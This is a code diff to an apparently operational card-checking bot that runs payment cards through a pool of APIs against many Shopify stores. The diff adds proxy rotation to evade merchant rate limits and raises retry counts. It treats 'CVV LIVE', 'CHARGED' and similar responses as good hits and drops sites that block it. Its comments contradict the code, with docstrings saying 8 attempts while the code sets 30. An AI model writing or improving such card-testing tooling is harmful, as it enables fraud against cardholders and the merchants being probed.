@@ -10060,12 +10060,15 @@ SHOPIFY_API_POOL = [
 
 # ============ SHOPIFY API POOL MANAGER ============
 
+# ============ SHOPIFY API POOL MANAGER - FIXED WITH PROXY ROTATION ============
+
 class ShopifyAPIPool:
     """
     Rotates between multiple Shopify APIs to distribute load
     Supports weighted round-robin and automatic failover
-    MAX 5 TOTAL ATTEMPTS per card (not per API)
+    MAX 8 TOTAL ATTEMPTS per card (not per API)
     GOOD sites (CARD_DECLINED/OTP_REQUIRED) are NEVER removed
+    PROXY ROTATION on retry to avoid rate limiting
     """
     
     def __init__(self, apis=None):
@@ -10096,7 +10099,6 @@ class ShopifyAPIPool:
         print(f"🔌 Shopify API Pool initialized with {len(self.apis)} APIs")
         for api in self.apis:
             print(f"   • {api['name']}: {api['url']} (weight: {api.get('weight', 1)})")
-            
     
     async def get_session(self):
         """Get or create HTTP session"""
@@ -10150,7 +10152,7 @@ class ShopifyAPIPool:
             
             print(f"🔄 [API POOL] Selected: {selected['name']} (weight: {selected.get('weight', 1)}, success: {success_rate:.0f}%)")
             
-            return selected.copy()  # Return a copy to avoid mutation
+            return selected.copy()
     
     def mark_api_result(self, api_name: str, success: bool, response_time: float, is_retryable: bool = False):
         """Mark API call result for statistics and adaptive weighting"""
@@ -10201,12 +10203,30 @@ class ShopifyAPIPool:
     async def check_card_with_pool(self, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
         """
         Check a card using the best available API from the pool
-        MAX 5 TOTAL ATTEMPTS per card
+        MAX 8 TOTAL ATTEMPTS per card
+        PROXY ROTATION on retry to avoid rate limiting
         GOOD sites (CARD_DECLINED/OTP_REQUIRED) are NEVER removed
         """
-        max_attempts = 50
+        max_attempts = 30  # Reduced from 20 to 8 for efficiency
         tried_apis = []
         tried_sites = [site]
+        tried_proxies = [proxy]  # Track tried proxies
+        
+        # Get user's working proxies for rotation
+        user_proxies = []
+        if user_id and user_id in autosopi_proxy_tracker.working_proxies:
+            user_proxies = autosopi_proxy_tracker.working_proxies.get(user_id, [])
+            # Remove the current proxy from the list if it's causing issues
+            if proxy in user_proxies and len(user_proxies) > 1:
+                user_proxies = [p for p in user_proxies if p != proxy]
+        
+        # Print proxy rotation info
+        if user_proxies:
+            print(f"🔄 [PROXY ROTATION] {len(user_proxies)} working proxies available for rotation")
+            for i, p in enumerate(user_proxies[:5]):
+                print(f"   {i+1}. {mask_proxy(p)}")
+            if len(user_proxies) > 5:
+                print(f"   ... and {len(user_proxies) - 5} more")
         
         for attempt in range(max_attempts):
             # Get a new API for each attempt
@@ -10219,8 +10239,10 @@ class ShopifyAPIPool:
                 continue
             tried_apis.append(api_name)
             
-            # For attempts after first, try a different site
+            # For attempts after first, try a different site AND proxy
             current_site = site
+            current_proxy = proxy
+            
             if attempt >= 1:
                 # Try a different site for retry
                 if hasattr(autosopi_site_manager, 'get_next_site_weighted'):
@@ -10232,25 +10254,60 @@ class ShopifyAPIPool:
                     current_site = new_site
                     tried_sites.append(new_site)
                     print(f"🔄 [RETRY #{attempt+1}] Trying different site: {current_site}")
+                
+                # ============ PROXY ROTATION ON RETRY ============
+                if user_proxies:
+                    # Find a proxy we haven't tried yet
+                    found_new_proxy = False
+                    for p in user_proxies:
+                        # Check if proxy is rate-limited
+                        if hasattr(autosopi_proxy_tracker, 'is_rate_limited'):
+                            if autosopi_proxy_tracker.is_rate_limited(user_id, p):
+                                print(f"⏭️ [PROXY] Skipping rate-limited proxy: {mask_proxy(p)}")
+                                continue
+                        if p not in tried_proxies:
+                            current_proxy = p
+                            tried_proxies.append(p)
+                            print(f"🔄 [RETRY #{attempt+1}] Rotating to NEW proxy: {mask_proxy(current_proxy)}")
+                            found_new_proxy = True
+                            break
+                    
+                    # If all proxies tried, recycle one
+                    if not found_new_proxy and user_proxies:
+                        # Try to find any proxy not currently rate-limited
+                        for p in user_proxies:
+                            if hasattr(autosopi_proxy_tracker, 'is_rate_limited'):
+                                if not autosopi_proxy_tracker.is_rate_limited(user_id, p):
+                                    current_proxy = p
+                                    tried_proxies.append(p)
+                                    print(f"🔄 [RETRY #{attempt+1}] Recycling proxy: {mask_proxy(current_proxy)}")
+                                    found_new_proxy = True
+                                    break
+                        
+                        # Last resort - use any proxy
+                        if not found_new_proxy:
+                            current_proxy = user_proxies[attempt % len(user_proxies)]
+                            print(f"🔄 [RETRY #{attempt+1}] Forcing proxy rotation: {mask_proxy(current_proxy)}")
             
             print(f"\n🔍 [API POOL] Attempt {attempt + 1}/{max_attempts} using: {api_name} (Site: {current_site})")
             
             start_time = time.time()
             
             try:
-                result = await self._make_api_request(api, card, current_site, proxy, user_id)
+                result = await self._make_api_request(api, card, current_site, current_proxy, user_id)
                 elapsed = time.time() - start_time
                 
                 if result is None:
                     print(f"❌ [API POOL] No result from {api_name}")
+                    self.mark_api_result(api_name, False, elapsed, True)
                     continue
                 
                 # Check if site was removed (from _make_api_request)
                 if result.get("site_removed", False):
                     print(f"🗑️ [API POOL] Site {current_site} was removed due to error, retrying with new site")
-                    # Remove from tried_sites so we can try a different one
                     if current_site in tried_sites:
                         tried_sites.remove(current_site)
+                    self.mark_api_result(api_name, False, elapsed, True)
                     continue
                 
                 response_text = result.get("message", "")
@@ -10260,7 +10317,7 @@ class ShopifyAPIPool:
                 # ============ CHECK IF SITE IS GOOD (PROTECTED) ============
                 # GOOD indicators - sites that return these are NEVER removed
                 good_indicators = [
-                    "CARD_DECLINED", "OTP_REQUIRED", " ORDER_PLACED", "3D REQUIRED",
+                    "CARD_DECLINED", "OTP_REQUIRED", "ORDER_PLACED", "3D REQUIRED",
                     "OTP", "3D", "CVV LIVE", "INSUFFICIENT FUNDS",
                     "ORDER_PLACED", "CHARGED", "ORDER COMPLETED"
                 ]
@@ -10275,6 +10332,11 @@ class ShopifyAPIPool:
                         
                     site_quality_tracker.record_response(current_site, response_text, status_category, price_val)
                     print(f"🌟 [SITE PROTECTION] Recorded GOOD response for {current_site}")
+                    
+                    # Mark proxy as working if it returned a good response
+                    if current_proxy and user_id:
+                        if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
+                            autosopi_proxy_tracker.record_proxy_result(user_id, current_proxy, response_text, elapsed)
                 
                 # ============ CHECK FOR SITE REMOVAL ERRORS ============
                 # ONLY remove if site is NOT GOOD
@@ -10292,16 +10354,31 @@ class ShopifyAPIPool:
                     else:
                         print(f"🗑️ [SITE REMOVAL] Removing bad site: {current_site} - {response_text[:50]}")
                         autosopi_site_manager.remove_site(current_site, OWNER_ID)
+                        self.mark_api_result(api_name, False, elapsed, True)
+                        
+                        if attempt < max_attempts - 1:
+                            print(f"🔄 [API POOL] Site issue, retrying with different site")
+                            continue
+                
+                # ============ CHECK FOR RATE LIMIT (429) - MARK PROXY ============
+                if "429" in response_text or "Site Error! Status: 429" in response_text:
+                    print(f"🚫 [RATE LIMIT] Rate limit detected on proxy: {mask_proxy(current_proxy)}")
+                    if current_proxy and user_id:
+                        if hasattr(autosopi_proxy_tracker, 'mark_rate_limited'):
+                            autosopi_proxy_tracker.mark_rate_limited(user_id, current_proxy, 120)
+                        # Also mark as failure so it's removed from working pool
+                        if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
+                            autosopi_proxy_tracker.record_proxy_result(user_id, current_proxy, response_text, elapsed)
                     
                     if attempt < max_attempts - 1:
-                        print(f"🔄 [API POOL] Site issue, retrying with different site")
+                        print(f"🔄 [API POOL] Rate limit, retrying with different proxy")
                         continue
                 
                 # ============ REAL CARD DECLINE PATTERNS (FINAL, NO RETRY) ============
                 real_decline_patterns = [
                     "CARD_DECLINED", "DECLINED", "INSUFFICIENT FUNDS", "FRAUD_SUSPECTED","GENERIC_ERROR", 
                     "EXPIRED CARD", "DO NOT HONOR", "LOST CARD", "STOLEN CARD","GENERIC_ERROR",
-                    "RESTRICTED CARD", "PAYMENTS_CREDIT_CARD_GENERIC",  
+                    "RESTRICTED CARD", "PAYMENTS_CREDIT_CARD_GENERIC",
                     "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT",
                     "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
                     "PAYMENTS_CREDIT_CARD_NOT_SUPPORTED",
@@ -10362,24 +10439,28 @@ class ShopifyAPIPool:
                 
                 # ============ CHECK FOR RETRYABLE ERRORS ============
                 retryable_patterns = [
-                    "NO VALID PAYMENT METHOD FOUND",  "404", "HTTP Error: 404", "No products under $3 found!", "No products", "UNKNOWN","FAILED TO GET SESSION TOKEN",
+                    "NO VALID PAYMENT METHOD FOUND", "No products under $3 found!", "No products", "UNKNOWN",
+                    "FAILED TO GET SESSION TOKEN",
                     "DECISION_RULE_BLOCK", "Unable to get payment token: 422, message='Attempt", "Unable to get payment token: 422",
-                    "CART FAILED WITH STATUS 422", "CART FAILED WITH STATUS 429","Cart failed with status 403",  "error: ",
-                    "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",  "SITE ERROR! STATUS: 429",
-                    "MERCHANDISE_EXPECTED_PRICE_MISMATCH","<b>No Valid Products</b>","VALIDATION_CUSTOM", "Error Processing Card: 500", 
+                    "CART FAILED WITH STATUS 422", "CART FAILED WITH STATUS 429",
+                    "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",
+                    "MERCHANDISE_EXPECTED_PRICE_MISMATCH","<b>No Valid Products</b>","VALIDATION_CUSTOM",
                     "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED","No Valid Products","403", "<b>No products under $3 found!</b>",
-                    "INVALID_PAYMENT_METHOD", "Site not supported", "<b>No Valid Products</b>",  "UNKNOWN", "<b>No Valid Products</b>",
-                    "NO VARIANTS", "GENERIC_ERROR", "No Valid Products","VALIDATION_CUSTOM", "Error Processing Card: ", "Error Processing Card: 500, message='Internal Serv",
-                    "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT","Cart failed with status 403",
-                    "SUBMIT REJECTED", "TOKENIZE_FAIL", "INVALID JSON RESPONSE","Cart failed with status 403",
-                    "EMPTY_RESPONSE", "NO_SESSION_TOKEN", "PAYMENTS_METHOD","Cart failed",
-                    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED", "PAYMENT_METHOD_NOT_ACCEPTED"
+                    "INVALID_PAYMENT_METHOD", "Site not supported", "<b>No Valid Products</b>",
+                    "NO VARIANTS", "GENERIC_ERROR", "No Valid Products","VALIDATION_CUSTOM",
+                    "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT",
+                    "SUBMIT REJECTED", "TOKENIZE_FAIL", "INVALID JSON RESPONSE",
+                    "EMPTY_RESPONSE", "NO_SESSION_TOKEN", "PAYMENTS_METHOD",
+                    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED", "PAYMENT_METHOD_NOT_ACCEPTED",
+                    "Cart failed with status 429", "SITE ERROR! STATUS: 429",
+                    "HTTP Error: 404", "HTTP Error: 403", "HTTP Error: 401", "404",
+                    "SITE ERROR! STATUS: 404", "Cart failed with status 403",
                 ]
                 
                 is_retryable_error = any(pattern in response_upper for pattern in retryable_patterns)
                 
                 if is_retryable_error and attempt < max_attempts - 1:
-                    print(f"🔄 [API POOL] Retryable error, will try different API/site")
+                    print(f"🔄 [API POOL] Retryable error, will try different API/site/proxy")
                     self.mark_api_result(api_name, False, elapsed, True)
                     continue
                 else:
@@ -10470,13 +10551,12 @@ class ShopifyAPIPool:
                 if proxy_param:
                     clean_proxy = proxy_param.replace('http://', '')
                     params["proxy"] = clean_proxy
-                    print(f"🔧 Using proxy: {clean_proxy[:50]}...")
+                    print(f"🔧 Using proxy: {mask_proxy(clean_proxy)}")
             
             response = await session.get(api["url"], params=params)
             
             elapsed = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
             print(f"📥 Response time: {elapsed:.2f}s | Status: {response.status_code}")
-            
             
             if response.status_code != 200:
                 return {
@@ -10528,6 +10608,16 @@ class ShopifyAPIPool:
             
             response_upper = response_text.upper()
             
+            # ============ CHECK FOR RATE LIMIT (429) - MARK PROXY ============
+            if "429" in response_text or "Site Error! Status: 429" in response_text:
+                print(f"🚫 [RATE LIMIT] Rate limit detected on proxy: {mask_proxy(proxy)}")
+                if proxy and user_id:
+                    if hasattr(autosopi_proxy_tracker, 'mark_rate_limited'):
+                        autosopi_proxy_tracker.mark_rate_limited(user_id, proxy, 120)
+                    # Also record as a proxy result (failure due to rate limit)
+                    if hasattr(autosopi_proxy_tracker, 'record_proxy_result'):
+                        autosopi_proxy_tracker.record_proxy_result(user_id, proxy, response_text, elapsed)
+            
             # ============ RECORD GOOD SITE RESPONSES ============
             good_indicators = [
                 "CARD_DECLINED", "OTP_REQUIRED", "3D REQUIRED",
@@ -10541,6 +10631,7 @@ class ShopifyAPIPool:
                     price_float = float(price)
                 except (ValueError, TypeError):
                     price_float = 0.00
+                site_quality_tracker.record_response(site_clean, response_text, "good", price_float)
             
             # ============ CHECK FOR SITE REMOVAL ERRORS ============
             # ONLY remove if site is NOT GOOD
@@ -10668,9 +10759,9 @@ class ShopifyAPIPool:
                     "api_name": api["name"]
                 }
             
-            # ============ RETRYABLE ERRORS (try different site/api) ============
+            # ============ RETRYABLE ERRORS (try different site/api/proxy) ============
             retryable_patterns = [
-                "NO VALID PAYMENT METHOD FOUND", "HTTP Error: 404",  "404", "FAILED TO GET SESSION TOKEN",
+                "NO VALID PAYMENT METHOD FOUND", "FAILED TO GET SESSION TOKEN",
                 "DECISION_RULE_BLOCK", "No products under $3 found!", "<b>No products under $3 found!</b>",
                 "CART FAILED WITH STATUS 422", "CART FAILED WITH STATUS 429",
                 "SITE ERROR! STATUS: 401", "SITE ERROR! STATUS: 402", "SITE ERROR! STATUS: 403",
@@ -10681,8 +10772,10 @@ class ShopifyAPIPool:
                 "SITE DEAD", "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT",
                 "SUBMIT REJECTED", "TOKENIZE_FAIL", "INVALID JSON RESPONSE",
                 "EMPTY_RESPONSE", "NO_SESSION_TOKEN", "PAYMENTS_METHOD",
-                 "PAYMENT_METHOD_NOT_ACCEPTED",
-                "SITE ERROR! STATUS: 429", "Cart failed with status"
+                "PAYMENT_METHOD_NOT_ACCEPTED",
+                "SITE ERROR! STATUS: 429", "Cart failed with status",
+                "HTTP Error: 404", "HTTP Error: 403", "HTTP Error: 401", "404",
+                "SITE ERROR! STATUS: 404", "Cart failed with status 403",
             ]
             
             is_retryable = any(pattern in response_upper for pattern in retryable_patterns)
